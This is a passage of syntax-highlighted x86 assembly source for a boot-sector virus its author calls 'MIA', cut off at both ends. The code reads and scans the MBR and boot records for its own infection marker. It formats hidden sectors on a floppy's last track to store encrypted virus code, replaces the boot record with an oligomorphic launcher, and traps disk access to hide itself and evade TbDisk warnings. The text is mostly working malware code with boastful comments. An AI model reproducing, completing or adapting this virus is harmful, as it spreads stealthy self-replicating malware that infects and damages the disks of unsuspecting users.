 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Push interrupt caller's flags</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">                 </span><span class="sc1">; Set INT 15h during process to point at viral</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">; INT 15h handler so that no message like</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc0">      </span><span class="sc1">; "A disk is accessed via an unusual way ...</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; blah, blah, blah, beep ..." from TbDisk</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Revector</span><span class="sc0">               </span><span class="sc1">; he he he... MIA rules.....!!</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">04F0h</span><span class="sc4">],</span><span class="sc2">0370h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Decryptor</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Dualform</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0FC28h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0">        </span><span class="sc1">; to buffer at ES:[BX]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">               </span><span class="sc1">; Track 0, sector 1</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get DL value from stack</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                  </span><span class="sc1">; Head (side) 0</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Test whether AL = zero on entry...</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Morbid</span><span class="sc0">

</span><span class="sc5">ReadZero</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">               </span><span class="sc1">; Read single sector</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Successful</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                 </span><span class="sc1">; Disk was replaced?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">ReadZero</span><span class="sc0">               </span><span class="sc1">; Yes, so try again...</span><span class="sc0">

</span><span class="sc5">Morbid</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Biform</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0F828h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Restore all registers</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">; Do original interrupt request, MIA</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Recognize</span><span class="sc0">              </span><span class="sc1">; does this way to avoid some problems with</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">                         </span><span class="sc1">; TbDisk, 8-S</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">

</span><span class="sc5">Final</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Restorage</span><span class="sc0">              </span><span class="sc1">; Restore INT 15h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Achieve</span><span class="sc0">                </span><span class="sc1">; Go back to interrupt caller (keep flags intact)</span><span class="sc0">


                    </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Absit</span><span class="sc0"> </span><span class="sc5">ut</span><span class="sc0"> </span><span class="sc5">grolier</span><span class="sc0"> </span><span class="sc5">nisi</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">cruce</span><span class="sc0">!


</span><span class="sc5">Successful</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FEh</span><span class="sc4">],</span><span class="sc2">0AA55h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Morbid</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Floppy or fixed disk?</span><span class="sc0">
 </span><span class="sc6">jns</span><span class="sc0">    </span><span class="sc5">ViralScan</span><span class="sc0">              </span><span class="sc1">; Jump if floppy disk</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Purport</span><span class="sc4">],</span><span class="sc2">3Ch</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_5</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Save C/H/S location of MBR</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_6</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; Check four primary partition entries</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1AFh</span><span class="sc0">         

</span><span class="sc5">Partitor</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Scan MBR for active partition...</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">000Fh</span><span class="sc0">               </span><span class="sc1">; Each entry contains 16 bytes field</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; Bootable partition?</span><span class="sc0">
 </span><span class="sc6">loopnz</span><span class="sc0"> </span><span class="sc5">Partitor</span><span class="sc0">               </span><span class="sc1">; Nope, check next partition</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Morbid</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; Get number of first head in AL</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_6</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">                         </span><span class="sc1">; Get number of first cylinder &amp; sector in AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_5</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">                    </span><span class="sc1">; Read HD's active boot-record</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Morbid</span><span class="sc0">                 </span><span class="sc1">; Huh?</span><span class="sc0">

</span><span class="sc5">ViralScan</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Determine whether boot-record is viral or not</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">  </span><span class="sc1">; A near JMP ? (infected FD)</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Right</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0FAh</span><span class="sc0">  </span><span class="sc1">; or a CLI ? (infected HD)</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Rapidformat</span><span class="sc0">

</span><span class="sc5">Right</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Is the disk serial number: BABE-FEED ??!?</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc4">],</span><span class="sc2">0FEEDh</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Rapidformat</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc4">],</span><span class="sc2">0BABEh</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Rapidformat</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Falseforce</span><span class="sc0">

</span><span class="sc5">Rapidformat</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Check media descriptor...</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Troublesome</span><span class="sc0">      </span><span class="sc1">; (Relative) not a bug!!</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Troublesome</span><span class="sc0">            </span><span class="sc1">; Sector size: 512 bytes? branch if below</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get number of sectors</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">003Fh</span><span class="sc0">               </span><span class="sc1">; Number of sectors mustn't exceed 63</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">        </span><span class="sc1">; MIA needs 18 sectors</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Troublesome</span><span class="sc0">            </span><span class="sc1">; Too few sectors available?</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">0F8h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Alright</span><span class="sc0">                </span><span class="sc1">; Hard/fixed disk? yes!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">               </span><span class="sc1">; Test whether MIA can write to boot sector...</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">                    </span><span class="sc1">; Is this necessary?</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Troublesome</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Infects a floppy disk,  this is done  by formatting 18 sectors  on the last</span><span class="sc0">
</span><span class="sc1">; track of the disk,  (MIA chooses the side and sectors number randomly). The</span><span class="sc0">
</span><span class="sc1">; last track is not used by DOS so it's safe enough to put virus codes there,</span><span class="sc0">
</span><span class="sc1">; but  MIA  will still  trap any access to  that track to  prevent  user from</span><span class="sc0">
</span><span class="sc1">; knowing that MIA hides there - MIA puts original boot-record (encrypted) in</span><span class="sc0">
</span><span class="sc1">; first formatted sector and main  codes in next 17 sectors, then finally MIA</span><span class="sc0">
</span><span class="sc1">; will replace boot-record with oligomorphic boot-launcher.</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Track 0, side 0, sector 1, this is (of course)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; where the floppy boot-record located</span><span class="sc0">
                               

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; The format data buffer comprises track X, side X, sector X, and sector size</span><span class="sc0">
</span><span class="sc1">; (0=128, 1=256, 2=512, 3=1024). To format 18 sectors it needs 18 fields, now</span><span class="sc0">
</span><span class="sc1">; what MIA does here is setting up side and  sector numbers &amp; building format</span><span class="sc0">
</span><span class="sc1">; fields  (it seems like MIA does not wanna spend 72 bytes on (stupid!) fixed</span><span class="sc0">
</span><span class="sc1">; format fields). The fields ain't put above the CS:IP to avoid DMA overcross</span><span class="sc0">
</span><span class="sc1">; boundary error which (might be) a false error in some BIOSes that will fail</span><span class="sc0">
</span><span class="sc1">; the formatting process.  Note that some BIOSes return CF=0 after formatting</span><span class="sc0">
</span><span class="sc1">; but then return CF=1 with AH=04 (sector not found) when we try to read from</span><span class="sc0">
</span><span class="sc1">; or write to those sectors.</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; AX = total number of formatted sectors on disk</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; No formatted sectors??</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Troublesome</span><span class="sc0">            </span><span class="sc1">; Jump out</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Divide AX by number of sectors per track to</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; get number of total tracks per circle line</span><span class="sc0">
 </span><span class="sc6">jl</span><span class="sc0">     </span><span class="sc5">Division</span><span class="sc0">               </span><span class="sc1">; Branch if SF and OF states differ</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Increase AX if there's remainder</span><span class="sc0">

</span><span class="sc5">Division</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">                           </span><span class="sc1">; Convert word into doubleword</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; CX = total number of floppy disk sides</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Test whether DX is zero or not </span><span class="sc0">
 </span><span class="sc6">jnge</span><span class="sc0">   </span><span class="sc5">Bypass</span><span class="sc0">                 </span><span class="sc1">; SF &lt;&gt; OF</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Bypass</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; So now AX = the highest track number on disk</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Get random side number in AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">                  </span><span class="sc1">; Save side number in DH, for formatting process</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,-(</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; Choose first sector number randomly</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Zero ain't a valid sector number</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">        </span><span class="sc1">; 18 fields format data buffer to build.</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0">        </span><span class="sc1">; DI points fields buffer offset</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">Parameter</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Now build fields buffer for format...</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Just store number of track and side </span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store sector number and size</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; But sector must be increased each field to</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; format contiguous sectors</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">Parameter</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;      CH = track number to format</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0501h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Loader</span><span class="sc0">      </span><span class="sc1">;      AL = number of sector to format</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; ES:[BX] = segment:offset of fields buffer</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;      CL = (not needed) for later usage</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">                    </span><span class="sc1">;      DH = side number to format</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Ripedisk</span><span class="sc0">               </span><span class="sc1">; Jump if successful</span><span class="sc0">

</span><span class="sc5">Troublesome</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Morbid</span><span class="sc0">

</span><span class="sc5">Alright</span><span class="sc4">:</span><span class="sc0">
